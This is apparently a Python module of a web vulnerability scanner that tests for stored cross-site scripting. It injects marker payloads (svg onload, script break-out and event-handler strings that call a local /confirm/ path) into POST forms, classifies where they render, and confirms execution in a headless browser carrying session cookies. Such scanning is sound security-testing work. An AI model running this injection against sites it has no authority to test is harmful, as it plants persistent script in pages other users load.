import uuid
import requests
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def detect_context(html_content, payload):
    """
    Detects the context in which the payload is rendered.
    Returns a dictionary with context details.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # 1. Check if it's inside a script tag
    for script in soup.find_all('script'):
        if payload in (script.string or ""):
            return {"context": "script", "danger": "High", "reason": "Payload found inside <script> tag"}

    # 2. Check for SVG context
    for svg in soup.find_all('svg'):
        if payload in str(svg):
            return {"context": "svg", "danger": "High", "reason": "Payload found inside <svg> tag"}

    # 3. Check if it's inside an attribute
    for tag in soup.find_all(True):
        for attr, value in tag.attrs.items():
            if isinstance(value, str) and payload in value:
                # Check if it broke out
                if "<xss-test>" in html_content and tag.name != "xss-test":
                     return {"context": "attribute", "danger": "High", "reason": f"Payload broke out of attribute '{attr}' in <{tag.name}>"}
                return {"context": "attribute", "danger": "Medium", "reason": f"Payload found inside attribute '{attr}' in <{tag.name}>"}
            elif isinstance(value, list) and any(payload in v for v in value):
                return {"context": "attribute", "danger": "Medium", "reason": f"Payload found inside attribute '{attr}' list in <{tag.name}>"}

    # 4. Check if it's in a text node
    if payload in soup.get_text():
        if f"<xss-test>" in html_content or "<svg" in html_content:
            return {"context": "html", "danger": "High", "reason": "Payload rendered as raw HTML"}
        return {"context": "text", "danger": "Low", "reason": "Payload rendered as plain text (likely escaped)"}

    return {"context": "unknown", "danger": "Unknown", "reason": "Payload found but context couldn't be determined"}

def confirm_execution(url, scan_id, session_cookies):
    """
    Uses Playwright to visit the URL and confirm if the payload executed.
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        # print("[STORED-XSS] Warning: Playwright not installed. Skipping browser confirmation.")
        return "N/A"

    executed = False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            
            # Add session cookies to the browser context
            pw_cookies = []
            for cookie in session_cookies:
                pw_cookies.append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path
                })
            context.add_cookies(pw_cookies)
            
            page = context.new_page()
            
            # We detect execution if a request is made to our 'confirm' marker
            def handle_request(request):
                nonlocal executed
                if f"/confirm/{scan_id}" in request.url:
                    executed = True

            page.on("request", handle_request)
            
            # Also catch alerts
            page.on("dialog", lambda dialog: dialog.accept())

            try:
                page.goto(url, wait_until="networkidle", timeout=10000)
                time.sleep(2) # Give some time for event handlers to fire
            except Exception:
                pass 
                
            browser.close()
    except Exception as e:
        print(f"[STORED-XSS] Browser confirmation error: {e}")
        return "Error"
    
    return "True" if executed else "False"

def run_stored_xss_scan(base_url, endpoints, session, discovered_urls=None, max_forms=10):
    """
    Improved Stored XSS Scanner:
    1. Generate multiple context-specific payloads
    2. Inject into POST forms
    3. Re-visit discovered URLs
    4. Detect context and confirm execution
    """
    print(f"\n[STORED-XSS] Starting improved scan on {base_url}")
    
    scan_id = str(uuid.uuid4())[:8]
    
    # Context-specific payloads
    payloads = [
        {"type": "html", "content": f"<xss-test>RXSS_{scan_id}_HTML</xss-test>"},
        {"type": "attribute", "content": f"\"><xss-test>RXSS_{scan_id}_ATTR</xss-test>"},
        {"type": "event", "content": f"\" onerror=\"fetch('/confirm/{scan_id}')\" "},
        {"type": "svg", "content": f"<svg/onload=\"fetch('/confirm/{scan_id}')\">"},
        {"type": "script_break", "content": f"</script><script>fetch('/confirm/{scan_id}')</script>"},
        {"type": "javascript", "content": f"';fetch('/confirm/{scan_id}');//"},
    ]
    
    findings = []
    post_endpoints = [e for e in endpoints if e.get("method") == "POST"]
    post_endpoints = post_endpoints[:max_forms]
    
    # Phase 1: Injection Logic
    print(f"[STORED-XSS] Injecting {len(payloads)} payloads into {len(post_endpoints)} POST forms...")
    for endpoint in post_endpoints:
        for p in payloads:
            payload = p["content"]
            data = {}
            for param in endpoint.get("params", []):
                name = param.get("name")
                input_type = param.get("type", "text")
                if input_type in ["text", "textarea"]:
                    data[name] = payload
                else:
                    data[name] = param.get("value", "")
            
            try:
                url = endpoint.get("url")
                session.post(url, data=data, timeout=10)
            except Exception as e:
                print(f"[STORED-XSS] Error injecting into {url}: {e}")

    # Small delay for DB persistence
    time.sleep(1)

    # Phase 2: Retrieval and Context Detection
    urls_to_check = discovered_urls if discovered_urls else [base_url]
    print(f"[STORED-XSS] Re-visiting {len(urls_to_check)} URLs to detect storage...")
    
    potential_vulnerable_urls = set()
    
    for url in urls_to_check:
        try:
            r = session.get(url, timeout=10)
            html = r.text
            
            for p in payloads:
                payload = p["content"]
                if payload in html:
                    context_info = detect_context(html, payload)
                    print(f"[STORED-XSS] Found payload in {url} - Context: {context_info['context']} (Danger: {context_info['danger']})")
                    
                    # If high danger, we definitely want to check with browser
                    if context_info["danger"] == "High" or p["type"] == "event":
                        potential_vulnerable_urls.add(url)

                    findings.append({
                        "url": url,
                        "confidence": "High" if context_info["danger"] == "High" else "Medium",
                        "reason": context_info["reason"],
                        "payload": payload,
                        "vulnerability_type": "Stored XSS",
                        "context": context_info["context"],
                        "execution_confirmed": "Pending",
                        "impact": "Stored XSS allows attackers to execute malicious scripts in the browsers of all users who visit the affected page."
                    })
        except Exception as e:
            print(f"[STORED-XSS] Error checking {url}: {e}")

    # Phase 3: Browser Confirmation
    if potential_vulnerable_urls:
        print(f"[STORED-XSS] Attempting browser-based confirmation for {len(potential_vulnerable_urls)} URLs...")
        for url in potential_vulnerable_urls:
            confirmed = confirm_execution(url, scan_id, session.cookies)
            print(f"[STORED-XSS] Execution confirmation for {url}: {confirmed}")
            
            # Update findings with confirmation result
            for finding in findings:
                if finding["url"] == url:
                    finding["execution_confirmed"] = confirmed
                    if confirmed == "True":
                        finding["confidence"] = "Critical"
                        finding["reason"] += " (CONFIRMED via browser execution)"

    print(f"[STORED-XSS] Scan complete. Found {len(findings)} potential issues.")
    return findings
